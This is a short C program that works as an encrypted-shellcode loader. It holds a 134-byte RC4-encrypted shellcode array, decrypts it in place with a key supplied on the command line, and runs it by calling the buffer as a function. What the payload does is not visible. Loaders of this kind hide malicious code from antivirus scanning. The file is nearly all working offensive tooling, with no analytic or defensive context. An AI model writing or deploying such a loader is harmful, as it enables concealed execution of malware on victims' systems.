#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>

#define MAX_KEY_LENGTH 256
#define SIZE_S 256

unsigned char shellcode[] = "\x4c\x56\xd7\x40\x24\x07\x3d\x82\xfc\x0d\xe7\x25\x19\x48\x3d\xec\x28\x93\xd4\x25\x96\x98\x5b\xd6\xf3\xef\x53\x70\x7c\xa8\x79\x39\x05\x4d\x11\x6c\x31\x58\xc8\xdc\x07\x5c\x49\x42\xa1\x8c\x1a\xb7\x01\xb1\xcf\x7a\xc0\x9d\x73\x46\xe8\x98\x36\x89\xaf\xda\x3d\x28\x86\x84\xde\xd9\x67\xd8\xf6\x18\x02\xb8\xde\x2a\xb4\x02\x0e\x90\x3f\xfc\xfb\x33\x9e\x43\x21\x6d\xc8\xc6\x71\x04\xa4\x49\xec\xe5\xe6\x29\x65\x79\xaa\xe0\x5e\x54\x52\xc6\x55\xf3\x29\x18\x73\x49\xd0\xa3\x58\x35\xa4\xa9\x5d\x97\xce\x27\x40\xb5\x11\x0c\x26\x70\x7d\x1e\xb1\x4a";

int main(int argc, char *argv[]) {
  int a, b, c, t, key_length;
  unsigned char S[SIZE_S], *key;

  if (argc != 2) {
    fprintf(stderr, "\n\nError in parameters.\n\n Usage: %s <key(%d characters long)>\n\n\n\n", argv[0], MAX_KEY_LENGTH);
    return EXIT_FAILURE;
  }

  if (strlen(argv[1]) > MAX_KEY_LENGTH) {
    fprintf(stderr, "\n\nKey must contain up to %d bytes\n\n\n\n", MAX_KEY_LENGTH);
    return EXIT_FAILURE;
  }

  key = argv[1];
  key_length = strlen(key);

  /* Key-scheduling algorithm (KSA) */
  for (a = 0; a < SIZE_S; a++) {
    S[a] = a;
  }
  for (a = 0, b = 0; a < SIZE_S; a++) {
    b = (b + S[a] + key[a % key_length]) % SIZE_S;
    t = S[a];
    S[a] = S[b];
    S[b] = t;
  }

  /* Pseudo-random generation algorithm (PRGA) */
  for (a = 0, b = 0, c = 0; a < sizeof(shellcode); a++) {
    b = (b + 1) % SIZE_S;
    c = (c + S[b]) % SIZE_S;
    t = S[b];
    S[b] = S[c];
    S[c] = t;
    shellcode[a] = shellcode[a] ^ (S[(S[b] + S[c]) % SIZE_S]);
  }

  /* execute the decrypted payload */
  int (*ret)() = (int(*)())shellcode;
  ret();

  return EXIT_SUCCESS;
}
